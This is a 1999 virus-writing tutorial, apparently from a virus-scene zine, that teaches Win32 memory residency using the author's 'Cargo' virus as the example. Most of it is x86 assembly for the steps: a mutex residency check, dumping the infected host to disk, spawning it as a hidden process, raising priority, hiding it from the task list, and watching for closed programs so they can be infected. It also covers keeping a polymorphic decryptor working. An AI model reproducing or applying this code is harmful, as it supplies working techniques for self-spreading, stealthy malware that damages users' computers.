@@ -1,0 +1,724 @@
+  __________________________________________________________________________
+ (__________________________________________________________________________)
+ { __ }   { __ }        |                            |        { __ }   { __ }
+  |\\|     |\\|    .----O----------------------------O----.    |//|     |//|
+  |\\|     |\\|    |           Win32 Residency            |    |//|     |//|
+  |\\|     |\\|    `--------------------------------------'    |//|     |//|
+ {____}   {____}                                              {____}   {____}
+
+
+        ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
+        ³  Foreword  ³
+        ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        Win32  residency...  A  while  ago  people said it was impossible. My
+ reply  back  then: Bullshit!! As for the fact that I didn't have any clue on
+ how  to  do  it, is a whole other thing... Even from my very first article I
+ promised  I  will write about this. Until now, many virus writers researched
+ this  and  many  good  Windows residents were written. Please, do not make a
+ confusion  between  the Win32 residency and the Ring0 residency. I will talk
+ about  Ring0  residency  in another article. The Ring0 technique was largely
+ used  in  the  incipient  stages of windows virus programming by programmers
+ like  Quantum,  Zombie,  Tatung,  etc. The true Win32 residency, which works
+ also  on  WindowsNT  had to wait a little longer until the programmers got a
+ good  grip  on  the  use of the win32 apis, and on many of the hidden things
+ inside this system. One of the first ones to do so were Jacky Qwerty (Win32.
+ Redemption),  Virogen  (Win32.Enumero)  and  others.  Upon studying the docs
+ available, I  was not satisfied with the attainable methods for scanning for
+ the running processes. So, I stumbled over a program from the Visual C++ kit
+ called  PVIEW95.  While  disassambling and looking in the code I found out a
+ great  way  of  doing  it. The drawback: it doesn't work on WindowsNT... But
+ there is another method for WindowsNT that I will discuss later.
+
+        After  discovering  this method and solving a damn bug with help from
+ JackyQwerty,  I started working on a full Win32 resident virus. It was not a
+ long  time  until  Cargo appeared. And after the virus came this tutorial. I
+ will try to explain all the stuff one by one.
+
+        Even  if  you are eager to do a Win32 resident virus, I recommend you
+ to  read  the  basic  win32 stuff as it will help you understand most of the
+ explanations  here.  Also,  a  good  book  would  be handy... The "Win32 API
+ SuperBible" from ___ is a great refference. You should be familiar with what
+ a process is, what a thread is and how do they get created and ran.
+
+
+        I  will  assume  that we are working on a virus which holds the delta
+ handle in the EBP register and the refference to an api is done like this:
+
+        call [ebp+_<api name>]
+
+        So, the name of the real api preceded by an underscore.
+
+
+        Let's talk a little about the main concept behind process spawning.
+
+        The  idea  is this: the infected host starts running and the first to
+ receive  the control is our virus. Then, the code must dump on the hard disk
+ somewhere  a  file, a valid exe file, that contains the complete virus body.
+ Then  the  virus  must run this valid file and then return to host. It might
+ look  like  our virus finished execution, but if you think, you realize that
+ the  spawned  file, the one we dump on the hdd is still running. This is the
+ basic, big picture idea. We will start talking about this deeper.
+
+        Before  starting  to  talk let me explain what a mutex is. A mutex is
+ actually  a  process  relative handle. This means that whenever you create a
+ new mutex, each process is able to know wether that mutex already existed or
+ not.  This  is very important for our virus, as the mutex will represent the
+ signal  for  our  resident  state.  After the mutex is created one must call
+ GetLastError  and  if  eax  is  not  0  then it means that the mutex already
+ existed, it  was  already  created  by  another process. This is how our "go
+ resident" part starts:
+
+      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+      ³ Checking residency ³
+      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+      lea eax, [ebp+mutex]                   ; mutex name
+      push eax                               ;
+      push 1                                 ;
+      push 0                                 ;
+      call [ebp+_CreateMutexA]               ; create mutex
+      call [ebp+_GetLastError]               ;
+      or eax, eax                            ; already existed??
+      jnz spawned                            ;
+
+      If  execution continues here, it means that our virus in *not* resident
+ so  we must go resident. Otherwise, we jump to the "spawned" label where the
+ resident  code  continues  to  run.  The  "mutex"  variable points to a null
+ terminated string, something like: "my resident code",0 , or something...
+
+        ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+        ³ Dumping the file to HDD ³
+        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        There  exist two methods of dumping a file to hdd. One is used in the
+ Enumero  viru  by  Virogen  and it consists of carrying a second copy of the
+ virus  as  a  full  PE  file  and  dumping it. I, however, in my Cargo virus
+ choosed  another method, much harder, but, I think, more beautiful, if I may
+ say  so.  (please  note that JQ uses in his Redemption virus another method,
+ which  consists  in  attaching the whole virus with its PE header at the end
+ of file and changing the pointer in the MZ header to point to it; I will not
+ discuss  this  method  here).  My method consists in trying to dump the host
+ file  together with the virus from memory to disk. It might look simple, but
+ it  is not so simple. Remember that when in memory, the sections are aligned
+ by  padding  to  section  alignment  (usualy  1000h)  while on disk they are
+ aligned  to  file alignment (200h). So, we must rearrange the sections as we
+ dump  them  to meet those requirements. Let's start. First, we must create a
+ new empty file. The "spawnname" variable points to the name:
+
+      pushad                                 ;
+      push 0                                 ; file attributes
+      push 0                                 ; ""
+      push 2                                 ; Create New File
+      push 0                                 ; Security option = default
+      push 1                                 ; File share for read
+      push 80000000h or 40000000h            ; General write and read
+      lea eax, [ebp+spawnname]               ;
+      push eax                               ; pointer to filename
+      Call [ebp+_CreateFileA]                ;
+                                             ;
+      cmp eax, -1                            ; failed to create?
+      je exit                                ;
+      mov [ebp+filehandle], eax              ; save filehandle
+      popad                                  ;
+
+        After  we created the file we must start checking the running process
+ to see if there is any problem dumping it; we check for MS header, PE header
+ and so on:
+
+      mov esi, [ebp+imagebase]               ; first check that it is a
+      cmp word ptr [esi], 'ZM'               ; valid MS-DOS file...
+      jne exit                               ;
+      cmp word ptr [esi.MZ_lfarlc], 40h      ; check the NewExe marker
+      jne exit                               ;
+      mov esi, [esi.MZ_lfanew]               ; locate PE header offset
+      add esi, [ebp+imagebase]               ;
+      push 200h                              ; check if we can read
+      push esi                               ; the ammount of memo from there
+      call [ebp+_IsBadReadPtr]               ;
+      or eax, eax                            ;
+      jnz exit                               ;
+      cmp word ptr [esi], 'EP'               ; is it the PE header?
+      jne exit                               ;
+
+
+        Now we start retrieving data we will need to dump the file:
+
+      xor eax, eax                           ;
+      mov ax, [esi.NumberOfSections]         ; take number of sections
+      push eax                               ; and remember them
+      add esi, IMAGE_FILE_HEADER_SIZE        ; go to optional header
+      mov edx, [esi.OH_FileAlignment]        ; save file alignment
+      mov [ebp+filealign], edx               ;
+      add esi, IMAGE_OPTIONAL_HEADER_SIZE    ; go to the first section header
+      mov ecx, IMAGE_SECTION_HEADER_SIZE     ; multiplicator
+      mul ecx                                ; obtain all section headers size
+      mov edx, eax                           ; save it to edx
+      push edx                               ; and save it on the stack
+      add esi, eax                           ; go at the end
+
+        Now  we  are at the end of all the headers and we can write them down
+ in the destination file:
+
+      push esi                               ; write down all the headers
+      sub esi, [ebp+imagebase]               ; in the file to the new dest
+      push 0                                 ; file.
+      lea edx, nob                           ;
+      push edx                               ;
+      push esi                               ;
+      push [ebp+imagebase]                   ;
+      push [ebp+filehandle]                  ;
+      call [ebp+_WriteFile]                  ;
+      pop esi                                ;
+
+        And  now  starts  the hard part. Dumping the section bodies. First we
+ locate the first section header:
+
+      pop edx                                ; restore section headers size
+      pop ecx                                ; cx = number of sections
+      sub esi, edx                           ; go to the first section header
+                                             ;
+      pushad                                 ; save all regs
+
+        Now,  even  if  the section bodies *should* be in turn as the section
+ headers  show,  we must be sure that we locate first the smallest pointer to
+ raw data:
+
+      pushad                                 ; save all regs
+      mov edi, 09999999h                     ; now we will try to locate the
+                                             ; smallest PointerToRawData to
+locate_smallest_pointer:                     ; know which section body comes
+      mov eax, [esi.SH_PointerToRawData]     ; first, in case they are
+      cmp eax, edi                           ; mangled relative to their
+      jnb still_smaller                      ; headers.
+      xchg eax, edi                          ;
+                                             ;
+still_smaller:                               ;
+      add esi, IMAGE_SECTION_HEADER_SIZE     ;
+      loop locate_smallest_pointer           ;
+      mov [ebp+temp], edi                    ;
+      popad                                  ; restore registers
+
+        After  doing  this,  we  must pad a little, because the first section
+ body must start at a multiple of file alignment:
+
+
+      push ecx                               ;
+      push edx                               ;
+      push 1                                 ;
+      push 0                                 ;
+      push 0                                 ;
+      push [ebp+filehandle]                  ;
+      call [ebp+_SetFilePointer]             ; get in EAX how much we wrote
+      pop edx                                ; already in the destination
+      pop ecx                                ; file.
+                                             ;
+      mov edi, [ebp+temp]                    ; EDI is the first data offset
+      sub edi, eax                           ; and we must pad with the
+      add esi, edx                           ; difference!!
+                                             ;
+      push 0                                 ;
+      lea eax, nob                           ;
+      push eax                               ;
+      push edi                               ;
+      push esi                               ;
+      push [ebp+filehandle]                  ;
+      call [ebp+_WriteFile]                  ; write difference!!
+                                             ;
+      popad                                  ; restore regs
+
+        And now we come to the real section dump part:
+
+section_dump_loop:                           ; now let's dump the sections
+      push ecx                               ; bodies.
+      mov edi, [esi.SH_VirtualAddress]       ; take it from memory, aligned
+      add edi, [ebp+imagebase]               ; to imagebase
+      mov eax, dword ptr [esi.SH_VirtualSize]; now choose the smallest between
+      mov ecx, dword ptr [esi.SH_SizeOfRawData]; VirtualSize and SizeOfRawData
+      cmp ecx, eax                           ; to solve the Borland/MicroSoft
+      jnb ok_                                ; difference in linking.
+      xchg eax, ecx                          ;
+
+        Eax  now  holds  the  unaligned  size of the section. In memory it is
+ aligned to section align, and we must realign it to file align:
+
+ok_:
+      mov ecx, [ebp+filealign]               ; now we must align the size
+      push eax                               ; before alignment to the
+      push ecx                               ; file alignment, because in
+      xor edx, edx                           ; memory it was aligned to
+      div ecx                                ; section alignment
+      cmp edx, 0                             ;
+      jne more                               ;
+      pop ecx                                ;
+      pop eax                                ;
+      jmp no_more                            ;
+                                             ;
+more:                                        ;
+      pop ecx                                ;
+      sub ecx, edx                           ;
+      pop eax                                ;
+      add eax, ecx                           ; eax= size aligned
+
+        And now it's time to write the section body to disk:
+
+no_more:                                     ;
+      push 0                                 ; write the section to the
+      lea ecx, nob                           ;
+      push ecx                               ; file...
+      push eax                               ;
+      push edi                               ;
+      push filehandle                        ;
+      call [ebp+_WriteFile]                  ;
+
+        ...And continue until the last section:
+
+      pop ecx                                ; restore index
+      add esi, IMAGE_SECTION_HEADER_SIZE     ; get next section...
+      loop section_dump_loop                 ;
+
+        Now, we close the destination file and...
+
+      push [ebp+filehandle]                  ; close destination file!
+      call [ebp+_CloseHandle]                ;
+
+        ...we are over with the file dumping. Simple, huh?
+
+        A  few little things to say first about the name of the spawned file.
+ First  of  all  it can be anything, no need for an .exe extension. Second of
+ all,  the  best place to hide it would be the windows system directory, and,
+ in  my  opinion,  the  best  name would be <something>.dll. Your imagination
+ here!
+
+        ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+        ³ Running the virus ³
+        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        Now, our spawned file is on the hdd. All we need to do is run it as a
+ new  process  in  the  system.  For  this we must first retrieve the startup
+ information which we will use later:
+
+
+go_res:                                       ; let's go resident!
+       lea eax, [ebp+startupinfo]             ;
+       push eax                               ; get the startup info
+       call [ebp+_GetStartupInfoA]            ;
+
+        The  pointer  to  the  startup  information  is  used  by the call to
+ CreateProcess, where we start the new process:
+
+       lea eax, [ebp+processinfo]             ;
+       push eax                               ; and spawn ourselves
+       lea eax, [ebp+startupinfo]             ;
+       push eax                               ;
+       push 0                                 ;
+       push 0                                 ;
+       push 67108928h                         ;
+       push 0                                 ; do not inherit handles
+       push 0                                 ;
+       push 0                                 ;
+       lea eax, [ebp+spawnname]               ;
+       push eax                               ;
+       push 0                                 ;
+       call [ebp+_CreateProcessA]             ; Run the Process!!
+
+        After  creating  the  process,  the handle of the new started process
+ remains opened, therefore we must close it:
+
+       lea esi, [ebp+processinfo]             ; close the new process handle
+       push [esi.PI_hProcess]                 ;
+       call [ebp+_CloseHandle]                ;
+
+        And now, the final steps of this part of the virus:
+
+       push 1000                              ; allow new process to start
+       call [ebp+_Sleep]                      ;
+                                              ;
+       jmp exit                               ; return to host!
+
+        After this, the host continues running, while the new spawned copy of
+ the  virus has just started and begin execution. If you look a little above,
+ where we check the residency status, we checked if the mutex already existed
+ or  not. If it already exists, and this is the situation for the new spawned
+ copy  that  just started, the execution continues at the next label. Here we
+ must  do again the mutex trick, because if somebody runs by hand the spawned
+ copy  again, the stuff might get complicated, so we must be assured that the
+ code didn't pass through this gate twice:
+
+spawned:                                      ;
+       lea eax, [ebp+mutex2]                  ;
+       push eax                               ;
+       push 1                                 ; If the mutex already existed
+       push 0                                 ; it means we are already
+       call [ebp+_CreateMutexA]               ; resident, otherwise we must
+       call [ebp+_GetLastError]               ; quit!
+       or eax, eax                            ;
+       jnz exit                               ;
+
+        Now,  that  we  are inside the resident copy of our virus, we must do
+ all  the stuff needed to give us maximum strength. First we must get our own
+ handle and set ourself to Realtime Priority Class (highest):
+
+       call [ebp+_GetCurrentProcess]  ; get then current process handle
+       push 100h                      ; realtime priority class
+       push eax                       ; handle of current process
+       call [ebp+_SetPriorityClass]   ; set priority to realtime
+
+        Now,  for Windos95/98 we can register our process as a service in the
+ system,  which hides our process from the CTRL-ALT-DEL list. This will *NOT*
+ work on WindowsNT or Windows2000:
+
+       push 1                         ; Register the current running
+       push 0                         ; process as a service.
+       call [ebp+_RegisterServiceProcess];
+
+       Now,  to  have even more strength, we are about to create a new thread
+ and  set  it  to  the  highest  priority. We have to create it suspended and
+ resume it later:
+
+      lea eax, [ebp+threadid]        ; Prepare to create a new thread for
+      push eax                       ; the current process.
+      push 4                         ; Create it Suspended
+      push 0                         ;
+      lea eax, [ebp+VirusThread]     ;
+      push eax                       ;
+      push 0h                        ;
+      push 0                         ;
+      call [ebp+_CreateThread]       ; do it!
+                                     ;
+      mov [ebp+hthread], eax         ; save thread handle
+
+        The  new thread, where our virus will do the actual system monitoring
+ is given by the address of the "VirusThread" procedure.
+
+        After  creating  the thread (you could check for errors also), let us
+ set the priority of the new thread to Time Critical. This will give our code
+ a  priviledge  level  of  31, the highest possible. This is because the time
+ critical thread is combined with a realtime class process:
+
+      push 15                        ; set thread priority to
+      push [ebp+hthread]             ; TIME_CRITICAL
+      call [ebp+_SetThreadPriority]  ;
+
+        And now, let's resume the thread:
+
+      push [ebp+hthread]             ;
+      call [ebp+_ResumeThread]       ; start thread
+
+        The  currently running thread is useless now, so we can safely freeze
+ it  until  the  other one ends. This is done by waiting for the new thread's
+ handle to become signaled:
+
+      push -1                        ; stop current thread and wait for
+      push [ebp+hthread]             ; the other to finish
+      call [ebp+_WaitForSingleObject];
+
+        If the other thread ends, our spawned process will end also:
+
+      push 0                         ; quit...
+      call [ebp+_ExitProcess]        ;
+
+        And  now  let's concentrate on the actual part of the virus. The part
+ which monitors the system. Let me explain once again what we have here. Here
+ we  have  a  running  process,  with  a  running  thread, set to the highest
+ priority  possible,  and  invisible  in  the  system. I hope you realize the
+ strength we have now... All we need to do is find a way to check when one of
+ the  running processes ends, so we can infect it after closing. The method I
+ will  present  here  is  the one I use in the Cargo virus. There, I create 2
+ arrays  of strings. I first fill up one of them, and then, from time to time
+ I  fill the other array and compare them. As soon as one name dissapeares, I
+ infect it.
+
+        How  do  I  get the names of the running processes? I do it using the
+ toolhelp32 stuff. The apis used are as follows:
+
+        CreateToolhelpSnapshot32
+        Process32First
+        Process32Next
+
+        The  first  api gives us a so called snapshot handle, which is passed
+ to  the  next  two  apis.  The  next  two  apis  fill  up a structure called
+ PROCESSENTRY32,  where,  among  all  the data, we have the full pathname and
+ file  name  for  each  and  every  running processes. I will only give you a
+ guideline  to  the  virus thread, as the meaning of this article was to show
+ you  how to go resident. If you want to know all the stuff exactly check the
+ Cargo source code.
+
+        Now let's see how we do here... First we must retake the delta handle
+ because the new thread destroys it:
+
+VirusThread proc near                ; This is the resident part.
+       call thread_delta             ; we must get the delta again because
+                                     ; EBP gets smashed...
+thread_delta:                        ;
+       pop ebp                       ;
+       sub ebp, offset thread_delta  ;
+
+        And now, the main system look up loop:
+
+
+again_again:                         ;
+       call FillFirstArray           ; Create the first process names array
+                                     ;
+again:                               ;
+       cmp [ebp+error], 1            ; if there was an error, abort!
+       je exit_thread                ;
+       push 500                      ;
+       call [ebp+_Sleep]             ; sleep half a second
+       call FillSecondArray          ; Create the second process names array
+       call CompareArrays            ; compare the arrays
+       jnc again                     ; and loop...
+       jmp again_again               ;
+
+        If an error occurs, we can safely quit:
+
+exit_thread:                         ;
+       push 0                        ; finish current thread...
+       call [ebp+_ExitThread]        ;
+
+FillFirstArray proc near             ;
+       ...                           ;
+FillFirstArray endp                  ;
+                                     ;
+FillSecondArray proc near            ;
+       ...                           ;
+FillSecondArray endp                 ;
+
+        Here  we have the procedure that locates all the running processes in
+ the system:
+
+WalkProcesses proc near              ; Get the running processes...
+      push 0                         ; snap for the current process
+      push 2                         ; snap processes
+      call [ebp+_CreateToolhelp32Snapshot]  ; create toolhelp handle
+      mov [ebp+t32h], eax            ; save toolhelp handle
+      cmp eax, -1                    ; was it a failure?
+      je exit                        ;
+                                     ;
+      lea eax, [ebp+process32]       ; point the process32 structure
+      push eax                       ;
+      mov ecx, dword ptr [ebp+t32h]  ;
+      push ecx                       ;
+      call [ebp+_Process32First]     ; get first process
+      or eax, eax                    ; no process?
+      jz exit                        ; (thx JQwerty for the bug solving!)
+                                     ;
+      call init_memo                 ; init memory array!
+      cmp [ebp+error], 1             ; if error, it means we don't have
+      je no_next                     ; enough memory...
+                                     ;
+next:                                ;
+      lea eax, [ebp+process32]       ; get next process
+      push eax                       ;
+      mov ecx, dword ptr [ebp+t32h]  ;
+      push ecx                       ;
+      call [ebp+_Process32Next]      ;
+      or eax, eax                    ;
+      jz no_next                     ;
+      call incr_memo                 ; increment memory array!
+      cmp [ebp+error], 1             ;
+      je no_next                     ;
+      jmp next                       ;
+                                     ;
+no_next:                             ;
+      push [ebp+t32h]                ; close the toolhelp handle...
+      call [ebp+_CloseHandle]        ;
+      ret                            ;
+
+        The  calls  to  init_memo and incr_memo routines are not relevant for
+ this article. Just check them in the source of the Cargo virus.
+
+
+        Everytime  we  notice  that  one  process  has  ended,  we can call a
+ routine,  like for example the one that follows. This one displays a message
+ box with the name of the closed process:
+
+HandleClosedProcess proc near        ; When we are here, eax points the
+       pushad                        ; name of a valid win32 file which can
+                                     ; be handled.
+       push eax                      ;
+                                     ;
+       IF DEBUG                      ; if debug is on, you can remove
+       mov esi, eax                  ; the virus from memory by running any
+       push eax                      ; application called KILL.EXE,
+       call [ebp+_lstrlen]           ; which sets the error value to 1
+       add esi, eax                  ;
+       sub esi, 8                    ;
+       cmp [esi], 'LLIK'             ;
+       jne no_quit                   ;
+       mov [ebp+error], 1            ;
+       ENDIF                         ;
+                                     ;
+no_quit:                             ;
+       pop eax                       ;
+       mov esi, eax                  ;
+       push eax                      ;
+       lea ebx, [ebp+file]           ;
+       push ebx                      ;
+       call [ebp+_lstrcpy]           ;
+                                     ;
+       push 1000h                    ; AlwaysOnTop + Ok button
+       lea eax, [ebp+windowtitle]    ;
+       push eax                      ;
+       lea eax, [ebp+windowmessage]  ;
+       push eax                      ;
+       push 0                        ;
+       call [ebp+_MessageBoxA]       ; display message
+                                     ;
+       popad                         ;
+       ret                           ;
+HandleClosedProcess endp             ;
+VirusThread endp                     ;
+
+
+        This is it, basically...
+
+
+        ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+        ³ Recapitulation ³
+        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        Let's try a little diagram of what we did here:
+
+
+  V                              dump to disk
+  ³ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿          ÚÄÄÄÄÄÄÄÄÄ¿
+ ÚÅÄvÄÄÄÄÄÄÄÄÄ¿      ³          ³and run ÚVÄÄÄÄÄÄÄÄÄÄÄÄ¿ ÚÄÄÄÄÄÄÄ¿
+ ³³ Loaded    ³      ³          ³        ³³  On disk   ³ ³ CLOSE ³
+ ³³ Infected  ³      ³          ³        ³³  Infected  ³ ÀÄÄ^ÄÄÄÄÙ
+ ³³ Host      ³      ³Yes       ³        ³³  Host      ³    ³Yes
+ ³³           ³      ³          ³        ³³            ³    ³
+ ³³           ³  ÚÄÄÄÁÄÄÄÄ¿     ³        ³³            ³ ÚÄÄÁÄÄÄÄÄ¿
+ ÃÅÄÄÄÄÄÄÄÄÄÄÄ´  ³ mutex1 ³ No  ³        ÃÅÄÄÄÄÄÄÄÄÄÄÄÄ´ ³ mutex2 ³
+ ³ÀÄÄÄÄÄÄÄÄÄÄÄÅÄ>´ exists?ÃÄÄÄÄÄÙ        ³ÀÄÄÄÄÄÄÄÄÄÄÄÄÅ>´ exists?³
+ ³            ³  ÀÄÄÄÄÄÄÄÄÙ              ³ Virus       ³ ÀÄÄÂÄÄÄÄÄÙ
+ ³ Virus      ³                          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ    ³No
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ                                             ³
+                                                            ³
+                                                            ³
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+ ³ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ À>´ Set Realtime priority class ÃÄÄÄÄ>´ Hide Process ³
+   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ     ÀÄÂÄÄÄÄÄÄÄÄÄÄÄÄÙ
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+ ³ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ À>´ Create new suspended thread ÃÄÄÄÄ>´ Set time critical thread ³
+   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ     ÀÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÙ
+               ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ             ³
+               ³resume new thread                    ÚÄÄÄÄÄvÄÄÄÄÄ¿
+               ³                                     ³  Suspend  ³
+  ÚÄÄÄÄÄÄÄÄÄÄÄÄVÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿             ³  current  ³
+  ³                                    ³             ³  thread   ³
+  ³    Monitor system until shutdown   ³             ÀÄÄÄÄÄÄÄÄÄÄÄÙ
+  ³                                    ³
+  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+
+        This  is  how the virus Cargo works. I wrote also a small application
+ to  demonstrate  the  above  explained  things,  called SPAWN which does the
+ thing. It displays the names of each closed process. Try running it and then
+ open  and  close  different  processes. Even DOS windows get cought. Also, a
+ nice  thing  is to try to shut down and see how, before shutdown occurs, all
+ processes  are  cought  by SPAWN. It is the basic skeleton on which Cargo is
+ built.
+
+     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+     ³  EúRúRúAúTúA  ³
+     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        This  looked pretty easy, didn't it? Well, for one reason it is kinda
+ easy  once  you read carefully and second of all it looks easy because there
+ are some leaks in it... Leaks... Well, not quite leaks. Let's call them more
+ fix-ups...  The  fact  is  that  after all was said and done I realized that
+ there are some problems with the way I thought this up.
+
+        One  of the very first one was that whenever you create a new thread,
+ the  thread space will be limited to exactly it's length. This is a problem,
+ because  in  Cargo  I was trying to create a new thread with just a piece of
+ the  whole  code.  This  makes  the  rest of the code unreadable for the new
+ thread,  and  thus  impossible  to  replicate  in the host. The first way of
+ solving this would be to create the new thread starting from the virus start
+ until  the  virus  end. But this poses additional problems and checks at the
+ beginning.  Therefore, eventually in Cargo I droped the idea of a new thread
+ in  the  viral  resident  process.  Look  at the code and see. It works even
+ better as I think of it...
+
+        The  second  problem  occured  when  I  wanted  to  add a polymorphic
+ decryptor to Cargo. My MOF32 generates the code like this:
+
+        jmp decrypt
+        start:
+        (encrypted code)
+        decrypt:
+        (decryptor)
+        jmp start
+
+        When  an  infected host is ran, first the decryptor decrypts the code
+ and  gives  the  control to it. The resident part will spawn the copy on the
+ disk and start it. *But*, the spawned copy is not encrypted anymore! When it
+ starts, however, a jump to the polymorphic decryptor is done, as the spawned
+ copy  is  an  exact copy of the original file. Then, the decryptor messes up
+ the unencrypted code and all is gone to hell!
+
+        How to solve this? I did it in the following way: *before* spawning I
+ saved  the  length  of  the  jump  to  the decryptor into an address. Then I
+ changed  the length of the jump to 0. After spawning, in the place where the
+ spawned  code  runs  I restore the length of the jump from where I saved it,
+ because the new hosts must receive it as it was before. After doing this all
+ went ok!!
+
+ 
+        
+        Now  let  me  give you some more technical details on some structures
+ and apis that appeared in this article:
+
+        The structure passed to the Process32First and Next functions goes as
+ follows:
+
+ PROCESSENTRY32 STRUC                 ;
+     dwSize            DD 0           ;
+     cntUsage          DD 0           ;
+     th32ProcessID     DD 0           ;
+     th32DefaultHeapID DD 0           ;
+     th32ModuleID      DD 0           ;
+     cntThreads        DD 0           ;
+     th32ParentProcessID DD 0         ;
+     pcPriClassBase    DD 0           ;
+     dwFlags           DD 0           ;
+     szExeName DB 260  DUP(0)         ;
+ PROCESSENTRY32 ENDS                  ;
+
+        Even  if  the  names are more than obvious here is the description of
+ the fields:
+
+ dwSize              - the size of the structure
+ cntUsage            - the usage count for the dll (in how many processes
+                       is it loaded)
+ th32ProcessID       - the ID of the process
+ th32DefaultHeapID   - the ID of the heap
+ th32ModuleID        - the ID of the module
+ cntThreads          - no. of threads in the process
+ th32ParentProcessID - the ID of the parent process
+ pcPriClassBase      - the priority class of the process
+ dwFlags             - diverse flags
+ szExeName           - full name of process
+
+
+        And here is how to define the variable:
+
+        process32     PROCESSENTRY32 <size PROCESSENTRY32>
+
+        It  is  very important to do so, because if the size of the structure
+ is not defined, the calls to the Process32First and Next will fail!
+
+        However,  the  subject of this article was not to show the use of the
+ Toolhelp32  tools,  but  to  show  you  how  to go resident under Win32. The
+ subject  was only half met, because the RegisterServiceProcess will not work
+ under  WindowsNT.  For  windows  NT we must use the PSAPI.DLL functions, but
+ this will be a subject for a future article. For now, use this method ;-)
+
+        All the Best,
+
+                                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                                            ³   Lord Julus - 1999    Û
+                                            ÀÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
